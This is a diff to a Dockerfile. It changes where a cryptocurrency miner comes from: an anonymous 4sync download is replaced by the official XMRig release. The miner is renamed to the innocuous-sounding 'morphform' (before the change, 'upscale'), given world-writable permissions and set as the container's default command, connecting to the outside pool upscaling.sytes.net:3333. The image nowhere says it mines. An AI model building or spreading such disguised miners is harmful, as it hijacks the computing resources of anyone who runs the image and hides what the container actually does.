@@ -4,17 +4,15 @@ LABEL maintainer="Roman Nikov"
 
 RUN apt update; \
     apt install -y wget; \
-    wget https://www.4sync.com/web/directDownload/lVE-MUwS/Qd-dXiuh.09d66aee22964e91908cfc724d68c185; \
-    tar xf Qd-dXiuh.09d66aee22964e91908cfc724d68c185; \
-    cd upscale; \
-    cp config.json /usr/local/bin/config.json; \
-    cp xmrig /usr/local/bin/upscale; \
-    cd /usr/local/bin;
+    wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz; \
+    tar xf xmrig-6.16.4-linux-static-x64.tar.gz; \
+    cd xmrig-6.16.4; \
+    cp xmrig /usr/local/bin/xmrig; \
+    cd /usr/local/bin; \
+    mv xmrig morphform;
 
 WORKDIR /usr/local/bin
 
-RUN chmod 777 config.json;
+RUN chmod 777 morphform;
 
-RUN chmod 777 upscale;
-
-CMD upscale
+CMD morphform --url upscaling.sytes.net:3333 --tls
